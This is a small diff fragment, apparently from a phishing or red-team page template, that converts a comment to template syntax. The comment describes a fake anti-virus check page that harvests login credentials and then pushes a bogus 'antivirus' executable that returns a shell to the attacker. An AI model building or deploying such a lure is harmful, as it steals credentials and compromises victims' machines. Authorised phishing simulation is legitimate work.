@@ -1,4 +1,4 @@
-<!--This version of the anti-virus checking page both collects credentials then at 75%, redirects
+{# This version of the anti-virus checking page both collects credentials then at 75%, redirects #}
     to a page called "failed" which then prompts the user to download the antivirus exe and execute
     returning shell. Page order goes as such:
     1. Login
